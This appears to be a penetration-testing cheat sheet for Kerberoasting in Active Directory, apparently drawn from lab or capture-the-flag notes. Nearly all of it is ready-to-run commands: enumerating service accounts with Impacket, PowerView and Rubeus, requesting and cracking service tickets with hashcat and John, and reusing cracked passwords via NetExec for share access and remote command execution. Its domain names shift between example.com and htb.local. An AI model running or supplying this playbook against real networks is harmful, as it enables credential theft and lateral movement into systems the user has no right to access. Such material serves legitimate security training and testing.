# Kerberoasting

| Tool | When to use |
|---|---|
| `Rubeus.exe kerberoast` | On a domain-joined Windows machine with a shell |
| `impacket-GetUserSPNs` | From Linux with valid domain credentials |
| `nxc ldap` with `--kerberoasting` | When you want NetExec format output |

!!! tip "Tip"
    Target high-privilege service accounts first (those in Domain Admins, IT groups, etc.). Use BloodHound to identify which SPN accounts have paths to DA before cracking all hashes blindly.

---

## Pre-Access: SPN Enumeration with Valid Creds

### Impacket `GetUserSPNs.py`

```bash
python3 GetUserSPNs.py example.com/web_svc:Diamond1 -dc-ip 10.10.10.10
```

Output:

```
ServicePrincipalName    Name        PasswordLastSet     LastLogon
----------------------  ----------  ------------------- ------------
MSSQLSvc/sql01.htb.local:1433  svc_sql      2023-01-10 14:12:00   ...

$krb5tgs$23$*svc_sql@HTB.EXAMPLE:...
```

Request the ticket in hashcat format:

```bash
python3 GetUserSPNs.py example.com/web_svc:Password1 -dc-ip 10.10.10.10 -request
```

> Use `hashcat -m 13100` for this hash type.

---

## Post-Access: SPN Enumeration from a Shell

### Option A: PowerView

```powershell
Import-Module .\PowerView.ps1
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
```

### Option B: Rubeus

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Options:

- Add `/user:svc_sql` to limit results
- Use `/format:hashcat` for hashcat compatibility

---

## Ticket Cracking

### Crack with Hashcat

```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

### Crack with John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hashes.kerberoast
```

---

## Post-Crack: Reuse Credentials

```bash
nxc smb 10.10.10.10 -u svc_sql -p 'Summer2023!' -d example.com --shares
```

```bash
nxc winrm 10.10.10.10 -u svc_sql -p 'Summer2023!' -d example.com --exec "whoami"
```

